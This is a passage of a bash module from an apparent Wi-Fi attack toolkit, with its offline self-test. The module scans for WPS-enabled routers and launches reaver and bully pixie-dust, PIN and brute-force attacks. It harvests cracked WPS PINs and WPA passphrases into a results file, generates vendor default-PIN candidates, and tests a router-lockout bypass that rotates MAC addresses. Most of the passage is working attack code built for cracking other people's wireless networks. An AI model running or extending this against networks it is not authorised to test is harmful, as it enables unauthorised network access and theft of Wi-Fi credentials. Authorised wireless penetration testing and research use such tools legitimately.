    # wash defaults to survey mode (-u), which is PASSIVE: it only reads WPS
    # information elements out of beacons. APs that advertise WPS solely in
    # probe responses are invisible to it - the Free Freebox does exactly
    # that, which is why it never appeared. Scan mode (-s) actively probes,
    # which is what finds them. Set WPS_SCAN_PASSIVE=1 to stay quiet instead.
    local -a wargs=(-i "$iface")
    if [[ "${WPS_SCAN_PASSIVE:-0}" == "1" ]]; then
        wargs+=(-u)
    else
        wargs+=(-s)
    fi

    local ef; ef=$(mktemp 2>/dev/null) || ef=/dev/null
    local rows
    rows=$(timeout "$dur" wash "${wargs[@]}" 2>"$ef" | \
        grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | \
        awk '{
            gsub(/\r/, "");
            essid = ""
            for (i = 7; i <= NF; i++) essid = essid (i>7 ? " " : "") $i
            printf "%s\t%s\t%s\t%s\t%s\t%s\n", $1, $2, $3, $4, $5, essid
        }')
    local err; err=$(grep -v '^$' "$ef" 2>/dev/null | head -2)
    [[ "$ef" != /dev/null ]] && rm -f "$ef"

    if [[ -z "$rows" ]]; then
        case "$err" in
            *permission*|*pcap_activate*)
                printf 'ERROR\twash cannot capture: %s\n' "$err" >&2
                printf 'ERROR\tthe module needs root for the capture - the GUI runs it through pkexec\n' >&2 ;;
            "")  printf 'ERROR\tno WPS APs answered in %ss on %s\n' "$dur" "$iface" >&2 ;;
            *)   printf 'ERROR\twash: %s\n' "$err" >&2 ;;
        esac
        return 1
    fi
    printf '%s\n' "$rows"
}

# ═══════════════════════════════════════════════════════════════════
#  start attack
# ═══════════════════════════════════════════════════════════════════

wps_cli_start() {
    local method="$1" bssid="$2" channel="$3" essid="${4:-}"
    local backend="${5:-reaver}"
    [[ -z "$method" || -z "$bssid" || -z "$channel" ]] && {
        printf 'usage: --start METHOD BSSID CHANNEL [ESSID] [reaver|bully]\n' >&2
        return 2
    }

    local iface
    iface=$(wps_get_iface)
    [[ -z "$iface" ]] && { printf 'ERROR\tno monitor interface\n' >&2; return 1; }

    # Both backends open a raw socket. Without root that fails INSIDE the
    # tool as reaver's "pcap_activate status -5 - No such device exists",
    # which names the interface rather than the privilege - so it reads as a
    # hardware fault and sends you hunting for a missing adapter. Say what it
    # actually is, before the tool gets a chance to mislead.
    # WPS_UNPRIVILEGED_TEST is set only by --selftest, which calls this
    # function to check the argv it builds. Without an escape the guard
    # would make the test suite unrunnable by anyone but root.
    if [[ ${EUID:-$(id -u)} -ne 0 && -z "${WPS_UNPRIVILEGED_TEST:-}" ]]; then
        printf 'ERROR\tthe WPS attack needs root - the GUI runs it through pkexec\n' >&2
        printf 'ERROR\tfrom a shell, prefix the command with sudo\n' >&2
        return 1
    fi

    # Same guard as the scan: reaver and bully both need a monitor interface,
    # and starting on a managed one fails deep inside the tool. Only a KNOWN
    # wrong type is refused - if iw cannot tell us, let the tool report it.
    local itype
    itype=$(iw dev "$iface" info 2>/dev/null | awk '/type/ {print $2; exit}')
    if [[ -n "$itype" && "$itype" != "monitor" ]]; then
        printf 'ERROR\t%s is not in monitor mode - enable it in Interface Manager\n' \
            "$iface" >&2
        return 1
    fi

    wps_ensure_iface_up "$iface" || return 1

    if [[ -f "$WPS_CURRENT_PID" ]] && kill -0 "$(cat "$WPS_CURRENT_PID")" 2>/dev/null; then
        printf 'ERROR\tattack already running\n' >&2; return 1
    fi

    : > "$WPS_CURRENT_LOG"
    printf '%s (%s) ch %s [%s via %s]\n' \
        "${essid:-(unknown)}" "$bssid" "$channel" "$method" "$backend" \
        > "$WPS_CURRENT_TARGET"

    local -a cmd
    case "$backend" in
        bully)
            command -v bully >/dev/null || {
                printf 'ERROR\tbully not installed\n' >&2; return 1
            }
            case "$method" in
                pixie)
                    # -d is --pixiewps and takes NO argument (the interface is
                    # bully's trailing positional). It was missing here, so a
                    # "pixie" run was silently an ordinary PIN attack. -S and
                    # -B are pin-iteration modifiers and mean nothing to
                    # pixiewps, so they are gone too.
                    cmd=(bully -b "$bssid" -c "$channel" -d "$iface")
                    ;;
                pin)
                    # ordered pins, brute-forcing the checksum digit
                    cmd=(bully -b "$bssid" -c "$channel" -S -B "$iface")
                    ;;
                brute)
                    # random pin order, checksum digit brute-forced: the slow
                    # exhaustive search. -p takes a 7-8 digit starting PIN and
                    # 1234 was neither, so it is not passed at all.
                    cmd=(bully -b "$bssid" -c "$channel" -B "$iface")
                    ;;
                *)
                    printf 'ERROR\tunknown method: %s\n' "$method" >&2; return 2 ;;
            esac
            ;;
        reaver|*)
            command -v reaver >/dev/null || {
                printf 'ERROR\treaver not installed\n' >&2; return 1
            }
            case "$method" in
                pixie)
                    # -K is a flag in this build (help shows no argument, and
                    # `reaver -K 1` behaves identically to `-K`): the trailing
                    # 1 was noise that implied otherwise.
                    cmd=(reaver -i "$iface" -b "$bssid" -c "$channel" \
                         -K -vv -N -q)
                    ;;
                pin)
                    cmd=(reaver -i "$iface" -b "$bssid" -c "$channel" \
                         -vv -L -N -q)
                    ;;
                brute)
                    # FIXED: -d 0 causes instant lockout on most APs.
                    # Use -d 1 (1s between attempts) or omit for default.
                    cmd=(reaver -i "$iface" -b "$bssid" -c "$channel" \
                         -vv -L -N -d 1 -q)
                    ;;
                *)
                    printf 'ERROR\tunknown method: %s\n' "$method" >&2; return 2 ;;
            esac
            ;;
    esac

    # reaver keeps a session file per BSSID and, on finding one, asks
    #   "Restore previous session for X? [n/Y]"
    # Detached with no usable stdin that prompt blocks forever, which is why
    # an attack could report "started" and then sit there producing nothing.
    # Stale sessions are moved aside rather than deleted, so a previous run's
    # progress is never destroyed, and the prompt cannot arise.
    local bs="${bssid//:/}"
    local sf
    for sf in "./$bs.wpc" "/etc/reaver/$bs.wpc" \
              "$MOD_TMP/$bs.wpc" "$MOD_TMP/sessions/$bs.wpc"; do
        [[ -f "$sf" ]] && mv -f "$sf" "$sf.stale.$(date +%s)" 2>/dev/null
    done

    # reaver asks "Restore previous session for <bssid>? [n/Y]" whenever it
    # finds a session file, and it looks in its OWN working directory - which
    # a detached launch does not let us predict, so moving files aside cannot
    # be relied on. Answering the prompt does not depend on knowing where the
    # file is: 'n' starts a fresh session, and the pipe then closes so any
    # later prompt gets EOF instead of blocking.
    #
    # Launched directly (not in a subshell) so $! stays the tool's own pid;
    # in a background pipeline $! is the last element, which is setsid.
    printf 'n\n' | setsid "${cmd[@]}" > "$WPS_CURRENT_LOG" 2>&1 &
    local realpid=$!
    echo "$realpid" > "$WPS_CURRENT_PID"
    sleep 2

    # /proc, not kill -0: kill -0 returns EPERM for a root-owned process when
    # the caller is not root, which would read as "already exited".
    if [[ -d "/proc/$realpid" ]]; then
        printf 'STARTED\t%s\n' "$realpid"
    else
        # A tool that dies immediately is the common case here, so show why
        # instead of pointing at a log file the operator has to go and open.
        printf 'ERROR\t%s exited immediately\n' "$backend" >&2
        tail -n 5 "$WPS_CURRENT_LOG" 2>/dev/null | while IFS= read -r l; do
            printf 'LOG\t%s\n' "$l" >&2
        done
        return 1
    fi
}

wps_cli_stop() {
    local killed=0 pid=""
    [[ -f "$WPS_CURRENT_PID" ]] && pid=$(cat "$WPS_CURRENT_PID")
    if [[ -n "$pid" ]]; then
        # stop_kill_pid signals the process group first, so reaver's
        # forked children die with the leader.
        stop_kill_pid "$pid" && killed=1
    fi
    stop_sweep 'reaver -i' && killed=1
    stop_sweep 'bully .*-b' && killed=1

    if (( killed == 1 )) || [[ -z "$pid" ]]; then
        rm -f "$WPS_CURRENT_PID" "$WPS_CURRENT_TARGET"
        printf 'STOPPED\t%s\n' "$killed"
        return 0
    fi
    printf 'ERROR\treaver pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
    return 1
}

wps_cli_log() {
    [[ -f "$WPS_CURRENT_LOG" ]] && cat "$WPS_CURRENT_LOG"
    return 0
}

# ═══════════════════════════════════════════════════════════════════
#  harvest — extract PIN + PSK from the log, save to results
# ═══════════════════════════════════════════════════════════════════

wps_cli_harvest() {
    [[ ! -f "$WPS_CURRENT_LOG" ]] && { printf 'NONE\n'; return 1; }

    local pin psk
    pin=$(grep -oE "WPS PIN: '[^']+'" "$WPS_CURRENT_LOG" 2>/dev/null | \
          head -1 | sed "s/WPS PIN: '//;s/'$//")
    psk=$(grep -oE "WPA PSK: '[^']+'" "$WPS_CURRENT_LOG" 2>/dev/null | \
          head -1 | sed "s/WPA PSK: '//;s/'$//")

    # bully formats, taken from the binary's own strings:
    #   [*] Pin is '12345678', key is 'passphrase'   (the main success line)
    #   [Pixie-Dust] PIN FOUND: 12345678
    # The old pattern looked for digits straight after a colon, but bully
    # prints PIN   : '12345678' - quoted - so it never matched.
    if [[ -z "$pin" ]]; then
        pin=$(grep -oE "Pin is '[^']+'" "$WPS_CURRENT_LOG" 2>/dev/null | \
              head -1 | sed "s/Pin is '//;s/'$//")
    fi
    if [[ -z "$psk" ]]; then
        psk=$(grep -oE ", key is '[^']+'" "$WPS_CURRENT_LOG" 2>/dev/null | \
              head -1 | sed "s/, key is '//;s/'$//")
    fi
    [[ -z "$pin" ]] && pin=$(grep -oE 'PIN FOUND: [0-9]+' "$WPS_CURRENT_LOG" 2>/dev/null | \
                            head -1 | awk '{print $NF}')

    if [[ -n "$pin" || -n "$psk" ]]; then
        local bssid essid ts
        bssid=$(grep -oE 'Associated with ([0-9A-Fa-f:]+)' "$WPS_CURRENT_LOG" 2>/dev/null | \
                tail -1 | awk '{print $NF}')
        essid=$(grep -oE '\(ESSID: [^)]+\)' "$WPS_CURRENT_LOG" 2>/dev/null | \
                tail -1 | sed 's/(ESSID: //;s/)//')
        ts=$(date +%s)
        [[ -z "$bssid" ]] && bssid="?"
        [[ -z "$essid" ]] && essid="?"

        printf '%s\t%s\t%s\t%s\t%s\n' \
            "$bssid" "$essid" "$pin" "$psk" "$ts" >> "$WPS_RESULTS"
        printf 'PIN\t%s\nPSK\t%s\nBSSID\t%s\nESSID\t%s\n' \
            "$pin" "$psk" "$bssid" "$essid"
    else
        printf 'NONE\n'
        return 1
    fi
}

wps_cli_results_tsv() {
    [[ ! -s "$WPS_RESULTS" ]] && return 0
    cat "$WPS_RESULTS"
}

# ═══════════════════════════════════════════════════════════════════
#  vendor PIN candidates
# ═══════════════════════════════════════════════════════════════════

wps_cli_pin_candidates() {
    local mac="$1"
    local out="${2:-$WPS_DIR/candidates.txt}"
    # Optional serial: the documented Belkin algorithm needs the router's
    # serial (last 4 chars) in addition to the BSSID.
    local sn="${3:-}"
    [[ -z "$mac" ]] && { printf 'ERROR\tmac required\n' >&2; return 2; }

    wps_pin_candidates "$mac" "$out" "$sn"
    local n
    n=$(wc -l < "$out")
    printf 'FILE\t%s\nCOUNT\t%s\n' "$out" "$n"
    cat "$out"
}

# ═══════════════════════════════════════════════════════════════════
#  offline pixiewps
# ═══════════════════════════════════════════════════════════════════

# Extract the five values pixiewps needs from a reaver log:
#   PKE (public key of enrollee)
#   PKR (public key of registrar)
#   E-HASH1, E-HASH2
#   AUTHKEY
#   E-NONCE, R-NONCE
wps_extract_pixie_values() {
    local log="$1"
    [[ ! -f "$log" ]] && return 1

    local pke pkr ehash1 ehash2 authkey enonce rnonce
    pke=$(grep -oE 'E-S1: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')
    pkr=$(grep -oE 'E-S2: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')
    ehash1=$(grep -oE 'E-Hash1: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')
    ehash2=$(grep -oE 'E-Hash2: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')
    authkey=$(grep -oE 'AuthKey: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')
    enonce=$(grep -oE 'E-Nonce: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')
    rnonce=$(grep -oE 'R-Nonce: [0-9a-fA-F]+' "$log" 2>/dev/null | head -1 | awk '{print $2}')

    [[ -z "$pke" || -z "$pkr" || -z "$ehash1" || -z "$ehash2" ]] && return 1

    printf 'PKE\t%s\n' "$pke"
    printf 'PKR\t%s\n' "$pkr"
    printf 'EHASH1\t%s\n' "$ehash1"
    printf 'EHASH2\t%s\n' "$ehash2"
    [[ -n "$authkey" ]] && printf 'AUTHKEY\t%s\n' "$authkey"
    [[ -n "$enonce" ]] && printf 'ENONCE\t%s\n' "$enonce"
    [[ -n "$rnonce" ]] && printf 'RNONCE\t%s\n' "$rnonce"
    return 0
}

wps_cli_offline_pixie() {
    local log="${1:-$WPS_CURRENT_LOG}"
    [[ ! -f "$log" ]] && { printf 'ERROR\tno log at %s\n' "$log" >&2; return 1; }

    command -v pixiewps >/dev/null || {
        printf 'ERROR\tpixiewps not installed\n' >&2; return 1
    }

    local vals
    vals=$(wps_extract_pixie_values "$log")
    if [[ -z "$vals" ]]; then
        printf 'ERROR\tcould not extract pixie values from %s\n' "$log" >&2
        printf 'HINT\tthe reaver log must include E-S1/E-S2/E-Hash1/E-Hash2\n' >&2
        return 1
    fi

    local pke pkr ehash1 ehash2 authkey enonce rnonce
    while IFS=$'\t' read -r k v; do
        case "$k" in
            PKE) pke="$v" ;;
            PKR) pkr="$v" ;;
            EHASH1) ehash1="$v" ;;
            EHASH2) ehash2="$v" ;;
            AUTHKEY) authkey="$v" ;;
            ENONCE) enonce="$v" ;;
            RNONCE) rnonce="$v" ;;
        esac
    done <<< "$vals"

    info "running pixiewps on extracted values"

    local -a args=(-e "$pke" -r "$pkr" -s "$ehash1" -z "$ehash2")
    [[ -n "$authkey" ]] && args+=(-a "$authkey")
    [[ -n "$enonce" ]]  && args+=(-n "$enonce")
    [[ -n "$rnonce" ]]  && args+=(-m "$rnonce")

    pixiewps "${args[@]}" 2>&1 | tee "$WPS_PIXIE_OUT"

    if grep -qE 'WPS pin: [0-9]{8}' "$WPS_PIXIE_OUT"; then
        local pin
        pin=$(grep -oE 'WPS pin: [0-9]{8}' "$WPS_PIXIE_OUT" | head -1 | awk '{print $NF}')
        printf 'PIN\t%s\n' "$pin"
        ok "pixie dust recovered PIN: $pin"
        return 0
    fi
    printf 'NOTFOUND\n'
    return 1
}

# ═══════════════════════════════════════════════════════════════════
#  self-test
# ═══════════════════════════════════════════════════════════════════
# Offline only: no radio, no root, no network, and reaver/bully are never
# invoked. All files land in a scratch dir under $WPS_DIR and are removed
# before returning, so loot/wps is never written.
wps_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local st="$WPS_DIR/selftest-$$"
    rm -rf "$st"; mkdir -p "$st"
    local WPS_CURRENT_LOG="$st/current.log" WPS_CURRENT_TARGET="$st/current_target.txt" \
          WPS_CURRENT_PID="$st/current.pid" WPS_RESULTS="$st/results.tsv"

    # ── WPS PIN check digit (the value that makes a PIN accepted) ──
    # 1234567 -> 0 gives the canonical 12345670; the rest pin padding and
    # the 3,1,3,1,3,1,3 weighting.
    chk checksum-1234567 "$(wps_pin_checksum 1234567)" "0"
    chk checksum-0000000 "$(wps_pin_checksum 0000000)" "0"
    chk checksum-9999999 "$(wps_pin_checksum 9999999)" "5"
    chk checksum-1234506 "$(wps_pin_checksum 1234506)" "9"
    chk checksum-leftpads-short "$(wps_pin_checksum 123)" "6"
    chk canonical-pin "$(printf '%s%s' 1234567 "$(wps_pin_checksum 1234567)")" "12345670"

    # ── vendor PIN algorithms ──
    chk computepin-001122 "$(wps_pin_computepin 00:11:22:33:44:55)" "00262316"
    chk computepin-normalises "$(wps_pin_computepin 00-11-22-33-44-55)" "00262316"
    chk computepin-lowercase "$(wps_pin_computepin aa:bb:cc:dd:ee:ff)" "00349697"
    chk computepin-8-digits "$(wps_pin_computepin 00:11:22:33:44:55 | tr -cd 0-9 | wc -c)" "8"
    # ── vendor PINs: 8 digits, correct WPS check digit ──
    # D-Link: documented MAC-only algorithm (Heffner/TNS pingen.py == 3WiFi
    # algo_dlink on every vector checked).
    local dpin bpin
    dpin=$(wps_pin_dlink 00:11:22:33:44:55)
    chk dlink-001122      "$dpin" "67456000"
    chk dlink-lowercase   "$(wps_pin_dlink aa:bb:cc:dd:ee:ff)" "22891624"
    chk dlink-dashed      "$(wps_pin_dlink 00-11-22-33-44-55)" "67456000"
    chk dlink-pin-length-8 "$(printf '%s' "$dpin" | tr -cd 0-9 | wc -c)" "8"
    chk dlink-checksum-valid "${dpin:7:1}" "$(wps_pin_checksum "${dpin:0:7}")"
    # Belkin: the documented scheme takes the BSSID *and the serial*, so the
    # serial is an explicit argument. No MAC-only Belkin PIN is documented,
    # hence the refusal below instead of an invented one.
    bpin=$(wps_pin_belkin 00:11:22:33:44:55 4567)
    chk belkin-001122-4567 "$bpin" "49848076"
    chk belkin-pin-length-8 "$(printf '%s' "$bpin" | tr -cd 0-9 | wc -c)" "8"
    chk belkin-checksum-valid "${bpin:7:1}" "$(wps_pin_checksum "${bpin:0:7}")"
    chk belkin-nonhex-serial "$(wps_pin_belkin 00:11:22:33:44:55 GB12)" "53663696"
    # a longer serial is truncated to its last 4 chars ("3210")
    chk belkin-long-serial   "$(wps_pin_belkin 00:11:22:33:44:55 9876543210)" "07165122"
    out=$(wps_pin_belkin 00:11:22:33:44:55 2>&1); rc=$?
    chk belkin-no-serial-rc  "$rc" "2"
    chk belkin-no-serial-empty "$(printf '%s\n' "$out" | grep -cE '^[0-9]{8}$')" "0"
    chk belkin-no-serial-msg "$(printf '%s\n' "$out" | grep -c 'not derivable from the BSSID alone')" "1"
    out=$(wps_pin_dlink "" 2>&1); rc=$?
    chk dlink-no-mac-rc "$rc" "2"

    # ── candidate wordlist: 18 defaults (2 duplicated) + vendor PINs ──
    wps_pin_candidates "00:11:22:33:44:55" "$st/cand.txt"
    chk candidates-count      "$(wc -l < "$st/cand.txt")" "18"
    chk candidates-deduped    "$(sort -u "$st/cand.txt" | wc -l)" "$(wc -l < "$st/cand.txt")"
    chk candidates-has-computepin "$(grep -cx '00262316' "$st/cand.txt")" "1"
    chk candidates-has-dlink      "$(grep -cx '67456000' "$st/cand.txt")" "1"
    # ... no Belkin guess without a serial
    chk candidates-no-belkin-guess "$(grep -cx '0242707' "$st/cand.txt")" "0"
    wps_pin_candidates "00:11:22:33:44:55" "$st/cand-sn.txt" "4567"
    chk candidates-sn-count      "$(wc -l < "$st/cand-sn.txt")" "19"
    chk candidates-sn-deduped    "$(sort -u "$st/cand-sn.txt" | wc -l)" "$(wc -l < "$st/cand-sn.txt")"
    chk candidates-has-belkin    "$(grep -cx '49848076' "$st/cand-sn.txt")" "1"
    wps_pin_candidates "" "$st/cand-nomac.txt"
    chk candidates-no-mac-count "$(wc -l < "$st/cand-nomac.txt")" "16"

    # ── lockout classification (last 20 log lines only) ──
    printf '%s\n' "[+] trying PIN 12345670" "[!] WPS locked, AP throttling" > "$st/locked.log"
    wps_is_locked_out "$st/locked.log"; chk locked-detect "$?" "0"
    printf '%s\n' "[+] trying PIN 12345670" "[+] received M1" > "$st/clean.log"
    wps_is_locked_out "$st/clean.log"; chk locked-clean "$?" "1"
    wps_is_locked_out "$st/nope.log"; chk locked-missing-log "$?" "1"
    { printf '%s\n' "[!] AP locked"; for i in $(seq 1 25); do printf '[+] filler %s\n' "$i"; done; } > "$st/stale.log"
    wps_is_locked_out "$st/stale.log"; chk locked-outside-tail-window "$?" "1"

    # ── pixiewps value extraction from a reaver log ──
    cat > "$st/pixie.log" <<'LOG'
[+] E-S1: 00112233445566778899aabbccddeeff
[+] E-S2: ffeeddccbbaa99887766554433221100
[+] E-Hash1: 1111111111111111111111111111111111111111111111111111111111111111
[+] E-Hash2: 2222222222222222222222222222222222222222222222222222222222222222
[+] AuthKey: aabbccddeeff00112233445566778899
[+] E-Nonce: 0102030405060708
[+] R-Nonce: 0807060504030201
LOG
    chk pixie-values "$(wps_extract_pixie_values "$st/pixie.log")" \
        "$(printf '%s\n' \
            $'PKE\t00112233445566778899aabbccddeeff' \
            $'PKR\tffeeddccbbaa99887766554433221100' \
            $'EHASH1\t1111111111111111111111111111111111111111111111111111111111111111' \
            $'EHASH2\t2222222222222222222222222222222222222222222222222222222222222222' \
            $'AUTHKEY\taabbccddeeff00112233445566778899' \
            $'ENONCE\t0102030405060708' \
            $'RNONCE\t0807060504030201')"
    # Only the required four are mandatory; a log missing E-Hash2 is refused.
    grep -v 'E-Hash2' "$st/pixie.log" > "$st/pixie-partial.log"
    wps_extract_pixie_values "$st/pixie-partial.log" >/dev/null 2>&1
    chk pixie-missing-ehash2-rc "$?" "1"
    wps_extract_pixie_values "$st/no-such.log" >/dev/null 2>&1
    chk pixie-missing-file-rc "$?" "1"

    # ── harvest: PIN + PSK + BSSID + ESSID out of a reaver/bully log ──
    cat > "$WPS_CURRENT_LOG" <<'LOG'
[+] Associated with AA:BB:CC:DD:EE:FF (ESSID: Cafe)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'secretpw'
LOG
    chk harvest-output "$(wps_cli_harvest)" \
        "$(printf '%s\n' $'PIN\t12345670' $'PSK\tsecretpw' \
            $'BSSID\tAA:BB:CC:DD:EE:FF' $'ESSID\tCafe')"
    chk harvest-results-fields "$(awk -F'\t' 'NR==1{print $1"|"$2"|"$3"|"$4"|"NF}' "$WPS_RESULTS")" \
        "AA:BB:CC:DD:EE:FF|Cafe|12345670|secretpw|5"
    printf '%s\n' "[+] scanning" "[+] nothing useful" > "$WPS_CURRENT_LOG"
    chk harvest-no-credentials "$(wps_cli_harvest)" "NONE"
    wps_cli_harvest >/dev/null 2>&1
    chk harvest-no-credentials-rc "$?" "1"
    rm -f "$WPS_CURRENT_LOG"
    chk harvest-missing-log "$(wps_cli_harvest)" "NONE"

    # ── argument validation (must fire before a backend is launched) ──
    wps_cli_pin_candidates "" >/dev/null 2>&1
    chk pin-candidates-no-mac-rc "$?" "2"
    # The CLI must be able to reach the documented Belkin generator, which
    # takes the serial as an optional 3rd positional.
    out=$(wps_cli_pin_candidates 00:11:22:33:44:55 "$st/cand-cli.txt" 4567)
    chk pin-candidates-cli-count "$(printf '%s\n' "$out" | awk -F'\t' '$1=="COUNT"{print $2}')" "19"
    chk pin-candidates-cli-belkin "$(printf '%s\n' "$out" | grep -cx '49848076')" "1"
    out=$(wps_cli_pin_candidates 00:11:22:33:44:55 "$st/cand-cli2.txt")
    chk pin-candidates-cli-nosn-count "$(printf '%s\n' "$out" | awk -F'\t' '$1=="COUNT"{print $2}')" "18"
WPS_UNPRIVILEGED_TEST=1 wps_cli_start "" "" "" >/dev/null 2>&1
    chk start-usage-rc "$?" "2"

    # ── bully argv ──────────────────────────────────────────────────
    # A stub bully records exactly what would be executed. In bully,
    # `-d` is --pixiewps (a flag taking no argument) and the interface is the
    # trailing positional (G->ifname = argv[optind]); the old call passed
    # `-d "$iface"`, silently enabling pixiewps in every mode.
    local bstub="$st/bstub"
    mkdir -p "$bstub"
    cat > "$bstub/bully" <<'STUB'
#!/bin/sh
printf '%s\n' "$@" > "$BULLY_ARGV"
sleep 3
STUB
    chmod +x "$bstub/bully"
    local s_tmpdir="$TMP_DIR" s_bpath="$PATH"
    TMP_DIR="$st"; printf 'wtest0\n' > "$st/mon_iface"
    export BULLY_ARGV="$st/bully.argv"
    PATH="$bstub:$PATH"
    local bmethod bargs
    for bmethod in pixie pin brute; do
        rm -f "$st/bully.argv"
WPS_UNPRIVILEGED_TEST=1 wps_cli_start "$bmethod" aa:bb:cc:dd:ee:ff 6 TestNet bully >/dev/null 2>&1
        [[ -s "$WPS_CURRENT_PID" ]] && \
            kill -TERM "-$(cat "$WPS_CURRENT_PID")" 2>/dev/null
        bargs=$(paste -sd' ' "$st/bully.argv" 2>/dev/null)
        case "$bmethod" in
            pixie) chk bully-pixie-argv "$bargs" "-b aa:bb:cc:dd:ee:ff -c 6 -d wtest0" ;;
            pin)   chk bully-pin-argv   "$bargs" "-b aa:bb:cc:dd:ee:ff -c 6 -S -B wtest0" ;;
            brute) chk bully-brute-argv "$bargs" "-b aa:bb:cc:dd:ee:ff -c 6 -B wtest0" ;;
        esac
        # -d IS --pixiewps and takes no argument. Banning it outright (an
        # earlier "fix") turned the pixie method into an ordinary PIN attack,
        # which is exactly the silent failure this now guards against. It
        # belongs to pixie only, and must never swallow the interface - the
        # assertion below still proves the interface stays last.
        if [[ "$bmethod" == "pixie" ]]; then
            chk bully-pixie-has-d-flag \
                "$(grep -cx -- '-d' "$st/bully.argv" 2>/dev/null)" "1"
        else
            chk "bully-$bmethod-no-d-flag" \
                "$(grep -cx -- '-d' "$st/bully.argv" 2>/dev/null)" "0"
        fi
        chk "bully-$bmethod-iface-last" "$(tail -1 "$st/bully.argv" 2>/dev/null)" "wtest0"
    done
    PATH="$s_bpath"; TMP_DIR="$s_tmpdir"
    unset BULLY_ARGV
    rm -f "$st/mon_iface" "$st/bully.argv"

    # ═══════════════════════════════════════════════════════════════
    #  lockout bypass (offline: plan, strategy, accounting, refusal)
    # ═══════════════════════════════════════════════════════════════
    local WPS_BYPASS_PLAN="$st/bypass.plan" WPS_BYPASS_LOG="$st/bypass.log" \
          WPS_BYPASS_REPORT="$st/bypass.report.tsv"

    # ── MAC rotation primitives ──
    # A rotated MAC must stay unicast + locally administered, and keep the OUI.
    local rmac o1
    rmac=$(wps_random_client_mac)
    chk random-mac-shape "$(printf '%s' "$rmac" | grep -cE '^([0-9a-f]{2}:){5}[0-9a-f]{2}$')" "1"
    o1=$(( 16#${rmac%%:*} ))
    chk random-mac-unicast      "$(( o1 & 0x01 ))" "0"
    chk random-mac-local-admin  "$(( (o1 >> 1) & 0x01 ))" "1"
    chk random-mac-oui-kept "$(wps_random_client_mac 00:11:22 | grep -cE '^00:11:22:')" "1"
    chk offset-mac "$(wps_offset_mac aa:bb:cc:dd:ee:01 2)" "aa:bb:cc:dd:ee:03"
    chk offset-mac-wraps "$(wps_offset_mac aa:bb:cc:dd:ee:fe 3)" "aa:bb:cc:dd:ee:01"
    # The rotation command must actually carry the MAC it was handed.
    chk rotate-cmd-carries-mac \
        "$(wps_mac_rotate_cmd wlan9 aa:bb:cc:dd:ee:ff | grep -c 'aa:bb:cc:dd:ee:ff')" "1"
    wps_mac_rotate_cmd "" aa:bb:cc:dd:ee:ff >/dev/null 2>&1
    chk rotate-cmd-no-iface-rc "$?" "1"

    # ── attempt / lockout accounting reads the log, it does not guess ──
    cat > "$st/bypass.log" <<'LOG'
[+] Trying pin "12345670"
[+] Trying pin "12345671"
[!] WPS locked, AP throttling
[+] Trying pin "12345672"
LOG
    chk bypass-attempts "$(wps_log_attempt_count "$st/bypass.log")" "3"
    chk bypass-lockouts "$(wps_log_lockout_count "$st/bypass.log")" "1"
    chk bypass-state-locked "$(wps_lockout_observed_state "$st/bypass.log")" "LOCKED"
    printf '%s\n' '[+] Trying pin "12345670"' > "$st/clean-bypass.log"
    chk bypass-state-clear "$(wps_lockout_observed_state "$st/clean-bypass.log")" "CLEAR"
    chk bypass-state-nolog "$(wps_lockout_observed_state "$st/nope.log")" "NOLOG"
    chk bypass-attempts-nolog "$(wps_log_attempt_count "$st/nope.log")" "0"
    cat > "$st/bypass-pin.log" <<'LOG'
[+] Trying pin "12345670"
[+] WPS PIN: '12345670'
[+] WPA PSK: 'secretpw'
LOG
    chk bypass-pin "$(wps_log_pin "$st/bypass-pin.log")" "12345670"
    chk bypass-psk "$(wps_log_psk "$st/bypass-pin.log")" "secretpw"

    # ── refusal decision is a pure function of (iface, backend, injection) ──
    wps_lockout_bypass_refusal_reason "" reaver yes >/dev/null
    chk bypass-refuse-no-iface-rc "$?" "0"
    wps_lockout_bypass_refusal_reason wlp5s0 "" yes >/dev/null
    chk bypass-refuse-no-backend-rc "$?" "0"
    # The real refusal on this machine: monitor iface exists, reaver exists,
    # but the adapter is not injection-verified.
    local rreason
    rreason=$(wps_lockout_bypass_refusal_reason wlp5s0 reaver no)
    chk bypass-refuse-unverified-rc "$?" "0"
    chk bypass-refuse-names-injection \
        "$(printf '%s' "$rreason" | grep -c 'injection=no')" "1"
    chk bypass-refuse-names-iface \
        "$(printf '%s' "$rreason" | grep -c 'wlp5s0')" "1"
    wps_lockout_bypass_refusal_reason wlp5s0 reaver invalid >/dev/null
    chk bypass-refuse-unknown-rc "$?" "0"
    # ...and the one case that must NOT refuse.
    wps_lockout_bypass_refusal_reason wlp5s0 reaver yes >/dev/null
    chk bypass-allow-when-verified-rc "$?" "1"
    wps_lockout_bypass_refusal_reason wlp5s0 reaver unknown >/dev/null
    chk bypass-refuse-unknown-state-rc "$?" "0"

    # ── backend command generation ──
    chk bypass-cmd-reaver-mac \
        "$(wps_backend_cmd reaver wlan9 aa:bb:cc:dd:ee:ff 6 02:00:00:00:00:01 | grep -c -- '-m 02:00:00:00:00:01')" "1"
    chk bypass-cmd-reaver-rotate \
        "$(wps_backend_cmd reaver wlan9 aa:bb:cc:dd:ee:ff 6 02:00:00:00:00:01 | grep -c -- '-M')" "1"
    chk bypass-cmd-reaver-delay \
        "$(wps_backend_cmd reaver wlan9 aa:bb:cc:dd:ee:ff 6 02:00:00:00:00:01 | grep -c -- '-d 1')" "1"
    chk bypass-cmd-reaver-lockdelay \
        "$(wps_backend_cmd reaver wlan9 aa:bb:cc:dd:ee:ff 6 02:00:00:00:00:01 | grep -c -- '-l 60')" "1"
    chk bypass-cmd-bully-source \
        "$(wps_backend_cmd bully wlan9 aa:bb:cc:dd:ee:ff 6 02:00:00:00:00:01 | grep -c -- '-s 02:00:00:00:00:01')" "1"

    # ── PLAN emission ──
    local plan
